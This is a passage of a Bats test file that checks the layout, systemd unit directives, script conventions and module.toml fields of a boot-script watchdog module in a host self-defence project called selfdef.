    # operator-extension /usr/local/* discipline). A
    # regression that pointed ExecStart at /usr/bin/ would
    # surface as a "stale-watchdog-binary" on hosts where
    # operators patched the libexec copy. Locks the
    # libexec/selfdef ExecStart-path discipline on the
    # boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares After= ordering directive — boot-sequencing contract)" {
    # Sister to brain-wide systemd After= INVARIANT family.
    # Watchdog .service units MUST declare an After= directive
    # so they don't fire before the filesystem mounts that
    # contain their probe targets (canonically After=local-
    # fs.target so /etc/* is mounted before the watchdog
    # tries to sha256sum a config file). A regression
    # dropping After= would surface as "watchdog fires
    # during early-boot before /etc is mounted" which then
    # hashes nothing + emits a spurious "config missing"
    # alert. Locks the boot-sequencing discipline on the
    # boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^After=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares Documentation= — operator-doc-link canonical contract)" {
    # Sister to brain-wide systemd Documentation= INVARIANT
    # family. Watchdog .service units MUST declare a
    # Documentation= directive pointing operators at the
    # module's README (canonical: https://github.com/
    # cyberpunk042/selfdef modules/<slug>-watchdog/README.md).
    # A regression dropping Documentation= would leave
    # operators triaging journald entries without a direct
    # docs link. Locks the Documentation= operator-doc-link
    # discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog timer unit declares OnCalendar= — daily-cadence operator-predictable contract)" {
    # Sister to brain-wide systemd OnCalendar= INVARIANT
    # family. Watchdog .timer units MUST declare an
    # OnCalendar= directive (canonically daily at a staggered
    # time per the watchdog ladder so simultaneous-fire
    # thundering-herd is avoided). The operator can predict
    # when each watchdog runs based on the canonical timer
    # schedule. A regression dropping OnCalendar= would
    # leave the watchdog firing ONLY at OnBootSec (no
    # recurring daily cadence). Locks the daily-cadence
    # discipline on the boot-script-watchdog timer substrate.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^OnCalendar=' "${t}"
    done
}

@test "INVARIANT (boot-script-watchdog timer unit declares WantedBy=timers.target — timer-enable-graph contract)" {
    # Sister to brain-wide systemd timer [Install].WantedBy=
    # INVARIANT family. Watchdog .timer units MUST declare
    # WantedBy=timers.target so `systemctl enable selfdef-
    # <slug>.timer` wires the timer into the timers.target
    # symlink-graph + activates it on every boot. A
    # regression that swapped to WantedBy=multi-user.target
    # (the .service-side install target) would make the
    # timer enable-step a no-op + leave the watchdog
    # silently inactive. Locks the timer-enable-graph
    # discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^WantedBy=timers.target' "${t}"
    done
}

@test "INVARIANT (boot-script-watchdog timer unit declares Description= — operator-list-timers identification contract)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Watchdog .timer units MUST declare Description=
    # so operators triaging `systemctl list-timers` output
    # see a human-readable label per timer. Locks the
    # timer-Description discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Description=' "${t}"
    done
}

@test "INVARIANT (boot-script-watchdog timer unit file mode is 0644 — systemd unit-file mode convention)" {
    # Sister to brain-wide systemd unit-file mode INVARIANT
    # family. systemd unit files MUST be chmod 0644 (world-
    # readable + root-write-only). Locks the timer unit-file
    # mode discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        m=$(stat -c '%a' "${t}")
        [ "${m}" = "644" ]
    done
}

@test "INVARIANT (boot-script-watchdog timer unit declares Persistent= directive — boot-catchup-policy contract)" {
    # Sister to brain-wide systemd timer Persistent= INVARIANT
    # family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Persistent=' "${t}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script file exists in module systemd/ dir — ExecStart-target source-of-truth contract)" {
    # Sister to brain-wide ExecStart-target INVARIANT family.
    # The watchdog .service's ExecStart points at
    # /usr/local/libexec/selfdef/<slug>-watchdog.sh which is
    # the runtime install path; the source of truth lives at
    # modules/<slug>-watchdog/systemd/<slug>-watchdog.sh.
    # A regression that lost the script file would break
    # the cargo-deb manifest install + leave ExecStart
    # dangling. Locks the source-script-exists discipline
    # on the boot-script-watchdog substrate.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    [ -f "${script_dir}/boot-script-watchdog.sh" ] ||     [ -n "$(ls "${script_dir}"/*.sh 2>/dev/null)" ]
}

@test "INVARIANT (boot-script-watchdog timer's Unit= field references a .service in the same module dir — co-located unit-pair binding contract)" {
    # Sister to brain-wide timer Unit= INVARIANT family.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        unit=$(grep -E '^Unit=' "${t}" | head -1 | cut -d= -f2)
        [ -n "${unit}" ]
        [ -f "${timer_dir}/${unit}" ]
    done
}

@test "INVARIANT (boot-script-watchdog .sh script is executable (mode includes +x) — script-runnable contract)" {
    # Sister to brain-wide script-executable INVARIANT family.
    # The watchdog .sh script MUST be chmod +x so systemd's
    # ExecStart can invoke it without needing a bash prefix.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        [ -x "${s}" ]
    done
}

@test "INVARIANT (boot-script-watchdog README.md exists in module dir — operator-doc-trail contract)" {
    # Sister to brain-wide module-doc-trail INVARIANT family.
    # Every watchdog module ships a README.md documenting its
    # probe target + alert semantics + remediation. A
    # regression that lost the README would leave operators
    # without per-module ops docs.
    readme="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/README.md"
    [ -f "${readme}" ]
}

@test "INVARIANT (boot-script-watchdog service Documentation URL references github.com/cyberpunk042/selfdef — canonical-vcs operator-doc-resolve contract)" {
    # Sister to brain-wide Documentation URL canonical INVARIANT
    # family. The Documentation= URL MUST reference the github
    # repo + module README path so operators can resolve docs
    # offline (via git checkout) or online (via github browser).
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=.*github.com/cyberpunk042/selfdef' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script uses set -u flag — undefined-variable strict-mode contract)" {
    # Sister to brain-wide Bash strict-mode INVARIANT family.
    # Watchdog scripts MUST declare set -u (exit on
    # undefined variable). Without -u, typos in env-var names
    # silently expand to empty strings, masking bugs.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '^set -u' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script declares shebang #!/bin/bash or env bash — bash-interpreter contract)" {
    # Sister to brain-wide bash-shebang INVARIANT family.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -1 "${s}" | grep -qE '#!/.*bash|#!/usr/bin/env bash'
    done
}

@test "INVARIANT (boot-script-watchdog .sh script uses logger -t selfdef- canonical tag — SDD-062 logger-tag contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script emits canonical severity vocabulary {ok,warn,alert} — bounded-severity contract)" {
    # Sister to brain-wide bounded-severity INVARIANT family.
    # Watchdog scripts emit logger -t selfdef-<name> -- {...severity:...}
    # with severity in the canonical vocabulary. A regression
    # introducing custom severity values (info, error, critical)
    # would break operator-side filtering.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '"severity":"(ok|warn|alert)"' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script tag selfdef-boot-script matches module name — SDD-062 tag-canonical contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # The tag passed to logger -t MUST exactly match selfdef-boot-script
    # so operator triage via journalctl _SYSTEMD_UNIT or
    # SYSLOG_IDENTIFIER filtering surfaces the right module.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script declares profile-aware exit behavior — operator-extension profile-dispatch contract)" {
    # Sister to brain-wide profile-aware INVARIANT family.
    # Scripts MUST handle PROFILE=enforce vs report differently.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'PROFILE.*enforce|enforce.*PROFILE|profile.*enforce' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script declares baseline file path — operator-extensible baseline-state contract)" {
    # Sister to brain-wide baseline-state INVARIANT family.
    # Delta-scan watchdogs MUST declare a BASELINE variable referencing
    # /var/lib/selfdef/ so operators know where baseline state lives.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '/var/lib/selfdef/|BASELINE' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script declares MODULE-suffixed tag in logger -t — module-name-tag-consistency contract)" {
    # Sister to SDD-062 tag-canonical INVARIANT family. The tag passed to
    # logger -t MUST include the module slug so journalctl filtering by
    # tag surfaces only this watchdog's events.
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE 'logger -t selfdef-' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script file is non-empty (size > 100 bytes) — non-trivial-script contract)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        size=$(stat -c '%s' "${s}")
        [ "${size}" -gt 100 ]
    done
}

@test "INVARIANT (boot-script-watchdog .sh script has >20 lines — non-trivial-watchdog-body contract)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        lines=$(wc -l <"${s}")
        [ "${lines}" -gt 20 ]
    done
}

@test "INVARIANT (boot-script-watchdog .service unit file has >5 lines of directives — non-trivial-unit-file contract)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        lines=$(wc -l <"${s}")
        [ "${lines}" -gt 5 ]
    done
}

@test "INVARIANT (boot-script-watchdog .service unit ExecStart references /usr/local/libexec/selfdef/ path — canonical-binary-path contract)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .timer file exists at canonical path modules/boot-script-watchdog/systemd — canonical-systemd-dir layout)" {
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    [ -d "${timer_dir}" ]
    n=$(ls "${timer_dir}"/*.timer 2>/dev/null | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (boot-script-watchdog module.toml exists at canonical path modules/boot-script-watchdog/ — module-manifest existence 72-cycle)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    [ -f "${mtoml}" ]
}

@test "INVARIANT (boot-script-watchdog systemd dir exists at modules/boot-script-watchdog/systemd — systemd-dir-existence 73-cycle)" {
    sd="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    [ -d "${sd}" ]
}

@test "INVARIANT (boot-script-watchdog systemd dir is non-empty — systemd-content-presence 74-cycle)" {
    sd="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    n=$(ls "${sd}" | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (boot-script-watchdog .service file size > 100 bytes — substantial-service-unit 75-cycle)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        size=$(stat -c '%s' "${s}")
        [ "${size}" -gt 100 ]
    done
}

@test "INVARIANT (boot-script-watchdog .timer file size > 50 bytes — substantial-timer-unit 76-cycle)" {
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        size=$(stat -c '%s' "${t}")
        [ "${size}" -gt 50 ]
    done
}

@test "INVARIANT (boot-script-watchdog README.md file size > 100 bytes — substantial-readme 77-cycle)" {
    readme="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/README.md"
    size=$(stat -c '%s' "${readme}")
    [ "${size}" -gt 100 ]
}

@test "INVARIANT (boot-script-watchdog .service Documentation URL is HTTP/HTTPS — operator-doc-link-protocol 78)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=(http|https)://' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script has shebang line — POSIX-conformant 79)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -1 "${s}" | grep -qE '^#!'
    done
}

@test "INVARIANT (boot-script-watchdog .sh script declares set flag in first 50 lines — strict-mode-prologue 80)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        head -50 "${s}" | grep -qE '^set -'
    done
}

@test "INVARIANT (boot-script-watchdog module.toml size > 200 bytes — substantial-watchdog-manifest 81)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    size=$(stat -c '%s' "${mtoml}")
    [ "${size}" -gt 200 ]
}

@test "INVARIANT (boot-script-watchdog .service file is non-empty — non-trivial-unit-file 82)" {
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        [ -s "${s}" ]
    done
}

@test "INVARIANT (boot-script-watchdog .timer file is non-empty — non-trivial-timer-file 83)" {
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        [ -s "${t}" ]
    done
}

@test "INVARIANT (boot-script-watchdog .sh script body has at least one variable assignment — non-vacuous-script 84)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${script_dir}"/*.sh; do
        [ -f "${s}" ] || continue
        grep -qE '^[a-zA-Z_]+=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog .sh script path matches systemd dir layout — canonical-script-co-location 85)" {
    script_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    [ -d "${script_dir}" ]
    n=$(ls "${script_dir}"/*.sh 2>/dev/null | wc -l)
    [ "${n}" -ge 1 ]
}

@test "INVARIANT (boot-script-watchdog module.toml has install_paths section — SDD-026 mutation-manifest 86)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^\[install_paths\]' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths non-empty list 87)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert isinstance(ps, list) and len(ps) > 0
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths only absolute paths 88)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
for p in ps:
    assert isinstance(p, str) and p.startswith('/'), f'{p!r} not absolute'
"
}

@test "INVARIANT (boot-script-watchdog module.toml provides list non-empty 89 — capability-export-present)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
p = data.get('provides')
assert isinstance(p, list) and len(p) >= 1
"
}

@test "INVARIANT (boot-script-watchdog module.toml has at least 3 entries in install_paths.paths — substantial-manifest 90)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert len(ps) >= 3, f'expected >=3 paths, got {len(ps)}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths includes /etc/ entry — config-staging 91)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any(p.startswith('/etc/') for p in ps)
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths has /usr/local/libexec/selfdef/ entry 92)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any('libexec/selfdef' in p for p in ps)
"
}

@test "INVARIANT (boot-script-watchdog module.toml install_paths.paths has /var/ entry 93 — state-staging)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ps = (data.get('install_paths') or {}).get('paths', [])
assert any(p.startswith('/var/') for p in ps)
"
}

@test "INVARIANT (boot-script-watchdog module.toml [install_paths] declared at line beginning — TOML-section-header 94)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^\[install_paths\]' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml [install] block declared at line beginning — TOML-section-header 95)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^\[install\]' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml uses TOML key-value syntax — well-formed-TOML 96)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^name[[:space:]]*=' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml name field uses double-quoted string syntax — TOML-string-quote 97)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^name[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml version field uses double-quoted string syntax — TOML-string-quote 98)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^version[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml category field double-quoted — TOML-string-quote 99)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^category[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml summary field double-quoted — TOML-string-quote 100)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^summary[[:space:]]*=[[:space:]]*"' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml name field matches module dir basename — TOML-name-dir-coherence 101)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^name[[:space:]]*=[[:space:]]*"boot-script-watchdog"' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml top-level keys before any [section] — TOML-top-level-keys-first 102)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
with open('${mtoml}') as fp:
    for ln in fp:
        s = ln.strip()
        if not s or s.startswith('#'): continue
        if s.startswith('['): break
        assert '=' in ln
        break
"
}

@test "INVARIANT (boot-script-watchdog module.toml file is UTF-8 encoded — TOML-encoding-contract 103)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    file "${mtoml}" | grep -qE 'UTF-8|ASCII text'
}

@test "INVARIANT (boot-script-watchdog module.toml does not contain CRLF line endings — LF-only-contract 104)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    ! grep -qE $'\r' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml ends with newline — POSIX-line-ending-contract 105)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    last_char=$(tail -c 1 "${mtoml}" | od -An -c | tr -d ' ')
    [ "${last_char}" = "\\n" ]
}

@test "INVARIANT (boot-script-watchdog module.toml does not contain leading tabs — TOML-indentation-canonical 106)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    ! grep -qP '^\t' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml does not start with UTF-8 BOM — TOML-no-BOM-canonical 107)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    first3=$(head -c 3 "${mtoml}" | od -An -tx1 | tr -d ' ')
    [ "${first3}" != "efbbbf" ]
}

@test "INVARIANT (boot-script-watchdog module.toml file size exceeds 200 bytes — TOML-content-floor-canonical 108)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    sz=$(wc -c < "${mtoml}")
    [ "${sz}" -gt 200 ]
}

@test "INVARIANT (boot-script-watchdog module.toml has top-level category field with non-empty string value — TOML-category-field-canonical 109)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
cat = data.get('category')
assert isinstance(cat, str) and cat, f'category must be non-empty string, got {cat!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml has top-level phase field with value in bounded-vocab {main,pre,post} — TOML-phase-vocab-canonical 110)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ph = data.get('phase')
assert ph is None or ph in ('main','pre','post'), f'phase if present must be main|pre|post, got {ph!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml has [install] section header at start-of-line — TOML-install-section-header-canonical 111)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^\[install\]$' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml [install] check value is non-empty string ending with .sh — TOML-install-check-shape-canonical 112)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
ck = (data.get('install') or {}).get('check', '')
assert isinstance(ck, str) and ck and ck.endswith('.sh'), f'install.check must be non-empty .sh path, got {ck!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml version field matches semver X.Y.Z pattern — TOML-version-semver-canonical 113)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib, re
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
v = data.get('version', '')
assert re.fullmatch(r'[0-9]+\.[0-9]+\.[0-9]+', v), f'version must be semver X.Y.Z, got {v!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml summary field is non-empty string with length >= 30 chars — TOML-summary-substance-floor 114)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
s = data.get('summary', '')
assert isinstance(s, str) and len(s) >= 30, f'summary must be string with len >= 30, got len={len(s)} value={s!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml top-level requires field is a TOML list — TOML-requires-list-canonical 115)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('requires')
assert isinstance(r, list), f'requires must be list, got {type(r).__name__}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml top-level provides field is a TOML list — TOML-provides-list-canonical 116)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('provides')
assert isinstance(r, list), f'provides must be list, got {type(r).__name__}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml top-level conflicts field is a TOML list — TOML-conflicts-list-canonical 117)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('conflicts')
assert isinstance(r, list), f'conflicts must be list, got {type(r).__name__}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml top-level depends_on field is a TOML list — TOML-depends-on-list-canonical 118)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('depends_on')
assert isinstance(r, list), f'depends_on must be list, got {type(r).__name__}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml top-level consumes field is a TOML list — TOML-consumes-list-canonical 119)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('consumes')
assert isinstance(r, list), f'consumes must be list, got {type(r).__name__}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml top-level instanced field is a TOML boolean — TOML-instanced-bool-canonical 120)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
r = data.get('instanced')
assert isinstance(r, bool), f'instanced must be bool, got {type(r).__name__}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml [install] uninstall value is non-empty string ending with .sh — TOML-install-uninstall-shape-canonical 121)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
v = (data.get('install') or {}).get('uninstall', '')
assert isinstance(v, str) and v and v.endswith('.sh'), f'install.uninstall must be non-empty .sh path, got {v!r}'
"
}

@test "INVARIANT (boot-script-watchdog module.toml has [profiles] section header — TOML-profiles-section-canonical 122)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    grep -qE '^\[profiles\]$' "${mtoml}"
}

@test "INVARIANT (boot-script-watchdog module.toml [profiles] default field is non-empty string — TOML-profiles-default-canonical 123)" {
    mtoml="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/module.toml"
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
d = (data.get('profiles') or {}).get('default', '')
assert isinstance(d, str) and d, f'profiles.default must be non-empty string, got {d!r}'
"
}

